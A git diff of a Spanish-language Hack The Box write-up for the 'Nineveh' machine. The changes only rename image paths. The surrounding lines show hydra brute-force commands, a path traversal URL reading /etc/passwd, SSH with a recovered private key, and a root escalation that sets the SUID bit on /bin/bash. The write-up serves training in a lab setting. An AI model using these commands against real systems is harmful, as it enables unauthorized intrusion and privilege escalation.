@@ -3,7 +3,7 @@ title: "Nineveh - WriteUp"
 date: Fri Jun 13 2025 17:15:00 GMT+0200 (Central European Summer Time)
 categories: [WriteUps, HTB, Linux]
 tags: [ctf, nmap, htb, hydra, dirb, reverse-shell, linpeas, exploit, pspy, apache]
-image: /assets/img/htb-writeups/Pasted image 20240205174856.png
+image: /assets/img/htb-writeups/Pasted-image-20240205174856.png
 ---
 
 {% include machine-info.html
@@ -13,11 +13,11 @@ image: /assets/img/htb-writeups/Pasted image 20240205174856.png
   platform="HTB"
 %}
 
-![Nineveh](/assets/img/htb-writeups/Pasted image 20240205174856.png)
+![Nineveh](/assets/img/htb-writeups/Pasted-image-20240205174856.png)
 
 --------
 
-![NINEVEH](/assets/img/htb-writeups/Pasted image 20240205174856.png)
+![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205174856.png)
 
 ------
 
@@ -50,9 +50,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 HTTPS
 
-![NINEVEH](/assets/img/htb-writeups/Pasted image 20240205175555.png)
+![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205175555.png)
 
-![NINEVEH](/assets/img/htb-writeups/Pasted image 20240205175703.png)
+![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205175703.png)
 
 Nos bajamos la imagen y le echamos un vistazo:
 
@@ -133,7 +133,7 @@ Finished
 ===============================================================
 ```
 
-![NINEVEH](/assets/img/htb-writeups/Pasted image 20240205190614.png)
+![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205190614.png)
 
 Es vulnerable a la enumeración de usuarios. Comprobamos que _admin_ existe por lo que realizaremos un ataque de diccionario con _hydra_:
 
@@ -141,13 +141,13 @@ Es vulnerable a la enumeración de usuarios. Comprobamos que _admin_ existe por 
 hydra -l admin -P /usr/share/wordlists/rockyou.txt -I 10.129.229.157 http-post-form "//department/login.php:username=admin&password=^PASS^:Invalid Password"
 ```
 
-![NINEVEH](/assets/img/htb-writeups/Pasted image 20240205191552.png)
+![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205191552.png)
 
 ```http
 admin:1q2w3e4r5t
 ```
 
-![NINEVEH](/assets/img/htb-writeups/Pasted image 20240205191813.png)
+![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205191813.png)
 
 Intentamos hacer un path traversal.
 
@@ -155,7 +155,7 @@ Intentamos hacer un path traversal.
 http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../../../etc/passwd
 ```
 
-![NINEVEH](/assets/img/htb-writeups/Pasted image 20240205193037.png)
+![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205193037.png)
 
 Probamos las principales rutas hasta que hacemos un descubrimiento:
 
@@ -198,7 +198,7 @@ $ knock 10.129.229.157 571:tcp 290:tcp 911:tcp
 $ ssh amrois@10.129.229.157
 ```
 
-![NINEVEH](/assets/img/htb-writeups/Pasted image 20240205195032.png)
+![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205195032.png)
 
 Pero necesitamos un archivo de clave pública para poder entrar.
 
@@ -243,7 +243,7 @@ Vamos a ver qué hay en la ruta /db/:
 Warning: rand() expects parameter 2 to be integer, float given in /var/www/ssl/db/index.php on line 114
 ```
 
-![NINEVEH](/assets/img/htb-writeups/Pasted image 20240205181225.png)
+![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205181225.png)
 
 Podemos introducir un password. Si no lo encontramos intentaremos romperlo con _hydra_
 
@@ -251,21 +251,21 @@ Podemos introducir un password. Si no lo encontramos intentaremos romperlo con _
 $ hydra -l "" -P /usr/share/wordlists/rockyou.txt -I nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -s 443
 ```
 
-![NINEVEH](/assets/img/htb-writeups/Pasted image 20240205183334.png)
+![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205183334.png)
 
 Probamos la contraseña _password123_
 
-![NINEVEH](/assets/img/htb-writeups/Pasted image 20240205183447.png)
+![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205183447.png)
 
 Podemos intentar de crear un PHP o archivo PHP malicioso que nos envíe una Reverse Shell pero antes vamos a ver lo que hay en la otra ruta encontrado con el fuzzing... 
 
 Vamos a ver qué hay en la ruta /secure_notes/
 
-![NINEVEH](/assets/img/htb-writeups/Pasted image 20240205183136.png)
+![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205183136.png)
 
 Nos descargamos la imagen y al pasarle un _strings_ vemos esto...
 
-![NINEVEH](/assets/img/htb-writeups/Pasted image 20240205200652.png)
+![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205200652.png)
 
 Tenemos una clave privada!
 
@@ -275,23 +275,23 @@ Lo copiamos, lo metemos en un archivo que llamaremos _id_rsa_, le damos permisos
 $ ssh -i id_rsa amrois@10.129.229.157
 ```
 
-![NINEVEH](/assets/img/htb-writeups/Pasted image 20240205201016.png)
+![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205201016.png)
 
 Y pa dentro!!!
 
 Nos subimos linpeas y pspy como siempre y empezamos la enumeración.
 
-![NINEVEH](/assets/img/htb-writeups/Pasted image 20240205202652.png)
+![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205202652.png)
 
 Con pspy vemos que se ejecuta todo el rato
 
-![NINEVEH](/assets/img/htb-writeups/Pasted image 20240205204637.png)
+![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205204637.png)
 
 Vamos a ver la vulnerabilidad
 
 https://www.exploit-db.com/exploits/33899
 
-![NINEVEH](/assets/img/htb-writeups/Pasted image 20240205204743.png)
+![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205204743.png)
 
 El exploit consiste en crear un archivo con permisos de ejecución y llamarlo _update_, lo que pongamos ahí se ejecutará como root.
 
@@ -304,7 +304,7 @@ chmod u+s /bin/bash
 
 Esperamos...
 
-![NINEVEH](/assets/img/htb-writeups/Pasted image 20240205204524.png)
+![NINEVEH](/assets/img/htb-writeups/Pasted-image-20240205204524.png)
 
 PWNED!!!!
 ---
